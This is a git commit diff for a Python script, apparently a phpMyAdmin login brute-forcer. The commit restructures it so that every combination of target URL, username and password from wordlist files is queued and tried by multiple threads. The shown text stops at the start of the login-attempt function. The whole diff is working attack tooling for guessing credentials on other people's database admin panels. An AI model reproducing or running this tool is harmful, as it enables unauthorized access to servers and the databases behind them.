6d29bbea54f269b684d26c252088c95f3ba2aebd
ascokruubfb <34566003+ascokruubfb@users.noreply.github.com>
2020-10-16 16:19:05 +0800

    Update FuckPhpmyadmin.py

--- FuckPhpmyadmin.py
+++ FuckPhpmyadmin.py
@@ -1,4 +1,3 @@
-
 import requests
 import json
 
@@ -9,35 +8,29 @@ from queue import Queue
 import threading
 class FuckPhpmyadmin:
     url_list=Queue()
-    user_list=[]
-    pass_list=[]
     def __init__(self):
         print("Start........")
     def Load_Url(self,file,user,passx):
         files=open(file).read().split("\n")
         for file in files:
-            self.url_list.put(file)
-        userses=open(user).read().split("\n")
-        for userx in userses:
-            self.user_list.append(userx)
-        passes=open(passx).read().split("\n")
-        for pa in passes:
-            self.pass_list.append(pa)
+            userses=open(user).read().split("\n")
+            for userx in userses:
+                passes=open(passx).read().split("\n")
+                for pa in passes:
+                    self.url_list.put(file+"|"+userx+"|"+pa)
     def Start(self,max):
         for i in range(max):
             threading.Thread(target=self.Brute_start).start()
     def Brute_start(self):
         while not self.url_list.empty():
-            url=str(self.url_list.get())
-            for user in self.user_list:
-                for passx in self.pass_list:
-                    try:
-                        if self.Brute_kernel(url,user,passx)==0:
-                            break
-                    except:
-                        print("something is wrong")
-                        print(url)
-                        break
+            url=str(self.url_list.get()).split("|")
+            try:
+                if self.Brute_kernel(url[0],url[1],url[2])==0:
+                    break
+            except:
+                    print("something is wrong")
+                    print(url)
+                    break
 
     def Brute_kernel(self,url,username,password):
         http=requests.Session()
